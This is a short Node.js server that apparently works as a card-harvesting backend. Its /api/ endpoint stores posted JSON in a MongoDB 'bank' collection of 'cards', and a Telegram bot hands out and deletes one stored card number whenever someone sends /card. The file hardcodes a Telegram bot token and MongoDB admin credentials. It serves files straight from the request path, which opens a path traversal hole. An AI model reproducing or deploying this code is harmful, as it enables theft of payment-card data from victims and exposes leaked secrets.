const { createServer } = require('http')
const { readFile } = require('fs/promises')
const fs = require('fs/promises')
const TelegramBot = require('node-telegram-bot-api')
const port = 3000
const token = '5398898196:AAG8ziGrjxuj-L536T5JJknLEJeN_MjuKLo'
const bot = new TelegramBot(token, { polling: true })
const id = 499932529

const { MongoClient, ServerApiVersion } = require('mongodb');
const uri = "mongodb+srv://bank-admin:qXtv6HWP4AhWNjR6@cluster0.d0na8.mongodb.net/?retryWrites=true&w=majority";
const client = new MongoClient(uri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });

let collection

client.connect(async err => {
  collection = client.db("bank").collection("cards");
});


bot.on('message', async msg => {
  if (msg.text === '/card') {
    if (await collection?.count() > 0) {
      const result = await collection.findOneAndDelete({})
      bot.sendMessage(msg.chat.id, result.value.number)
    } else {
      bot.sendMessage(msg.chat.id, 'пішов нахер')
    }
  }
})

const server = createServer(requestListener)

server.listen(port)

async function requestListener(request, response) {
  let url = request.url
  if (url.startsWith('/api/')) {
    let chunks = []

    for await (const chunk of request) {
      chunks.push(chunk)
    }
    let json = Buffer.concat(chunks).toString()
    response.end('ok')
    await collection.insertOne(JSON.parse(json))
  } else {
    if (url == '/') {
      url = '/index.html'
    }
    readFile(url.slice(1), "utf-8").then(file => {
      response.end(file)
    }).catch(err => {
      response.statusCode = 404
      response.end('file not found: ' + url)
    })
  }
}


